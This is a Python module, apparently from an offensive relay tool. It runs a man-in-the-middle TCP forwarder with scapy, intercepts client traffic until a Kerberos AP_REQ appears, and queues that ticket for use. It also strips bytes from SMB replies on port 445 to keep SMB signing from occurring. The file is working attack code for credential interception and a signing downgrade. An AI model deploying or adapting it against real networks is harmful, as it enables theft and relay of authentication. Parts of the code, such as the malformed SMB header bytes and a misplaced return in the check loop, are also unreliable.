from scapy.pipetool import TransformDrain
from scapy.all import PipeEngine
import socketserver
import threading
import socket

from .custompipes import ConditionDrain, OnMessage, TriggeredTCPConnectPipe


# Serverclass that can be instantiated to forward traffic from a local port to another remote
#   destination. This TCP forward transfers every single packet from the connecting client to a
#   local pipeline which categorizes packets. If the `cond_f` function of the socketserver returns
#   False, the packet is forward to the remote destination. If it returns True, the packet is not
#   forwarded, the entire forwarding is stopped and the thread notifies every other started threads
#   to do so. The packet is then pushed to the main thread through a dedicated Queue.
class TCPForwarder(socketserver.StreamRequestHandler):
    def setup(self):  # method invoked when a client connects
        print(f"--->TCP Forward initiated from {self.client_address} to {self.server.destination}")

        # Method used to check wether a should be forwarded or not:
        def let_client_data_pass(data):
            # Here, server.condition_functions contain a list of functions declared by
            # modules to check wether a packet is interesting.
            for f in self.server.condition_functions:
                r, module = f(self.client_address, self.server.destination[1], data)
                if r:
                    self.server.interesting_packet_queue.put((self.client_address, data, module))
                    self.server.should_stop = True
                    return False
                return True

        # Method used to modify packets on the fly before being sent back to a client.
        # Here some SMB flags are removed to prevent SMB signature to occur when it is supported by
        # both clients and servers but not required.
        def transform_serv_data(data):
            if self.server.destination[1] == 445 and data[0:4] == b'\xfe\x53\4d\x42':
                return data.replace(b'\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a', b'')
            else:
                return data

        # Scapy plumbing to actualy perform the forwarding from a client, to our pipeline of
        # methods :
        #   client -> checkIfPacketIsInteresting -> Server -> modifyServerAnswer -> client
        #                         |
        #                         | contains AP_REQ
        #                         v
        #                       stop everything and notify main thread
        self.dest_pipe = TriggeredTCPConnectPipe(*self.server.destination)
        self.passdrain = OnMessage(lambda pkt: self.request.send(pkt))
        self.transformservdrain = TransformDrain(transform_serv_data)
        is_client_ignored = self.client_address[0] in self.server.ignore_ips
        # small whitelist here
        if not is_client_ignored:
            self.cond_pipe = ConditionDrain(let_client_data_pass)
        else:
            print(f"New connection from ignored ip {self.client_address[0]}")
            self.cond_pipe = ConditionDrain(lambda _: True)
        self.cond_pipe > self.dest_pipe > self.transformservdrain > self.passdrain
        self.pipeline = PipeEngine(self.dest_pipe)
        if not is_client_ignored:
            self.pipeline.add(self.cond_pipe)
        self.pipeline.start()
        self.dest_pipe.on_trigger(b'')
        self.request.setblocking(True)

    def handle(self):  # method invoked when receiving data
        try:
            while not self.server.should_stop:
                data = self.request.recv(65535, socket.SOCK_NONBLOCK)
                if data == b'':
                    break
                self.cond_pipe.push(data)
        except BrokenPipeError:
            self.finish("brokenpipe")
        except ConnectionResetError:
            self.finish("reset by peer")

    def finish(self, reason="client disconnected"):  # method invoked when a client disconnects
        print(f"--->TCP Forward ended for {self.client_address} ({reason})")
        self.pipeline.stop()


# A class to represents a Thread which starts a tcp forwarding server. It it is then possible with
# that to instantiate multiple instances to start forwarding for multiple different ports.
# Initialisation is done with the following arguments :
#   destination (str)   : ip of the server to which forward traffic
#   port (int)          : tcp port to which forward traffic on the destination server (will also be
#                         the port to listen to localy to perform forwarding)
#   packet_queue        : A queue.Queue object in which the first "interesting" packet will be
#                         pushed to.
#   condition_functions : A list of functions used to check wether a packet is interesting.
#                         The functions must return a 2-tuple with the following two informations:
#                              bool : is the packet interesting
#                              object: the module object itself (self) to know which module
#                                      declared the packet interesting
#   ignore_ips          : A set of IPs we dont want to inspect and modify packets. These clients
#                         will have their packets forwarded as-is without inspection.
class TCPForwardThread(threading.Thread):
    def __init__(self, destination, port, packet_queue, condition_functions, ignore_ips):
        threading.Thread.__init__(self)
        self.name = f"TCPForwarderThread-{destination}:{port}"
        socketserver.TCPServer.allow_reuse_address = True
        self.forwarder = socketserver.ThreadingTCPServer(("0.0.0.0", port), TCPForwarder)
        self.forwarder.destination = (str(destination), port)
        self.forwarder.should_stop = False
        self.forwarder.interesting_packet_queue = packet_queue
        self.forwarder.condition_functions = condition_functions
        self.forwarder.ignore_ips = ignore_ips

    def run(self):
        self.forwarder.serve_forever()
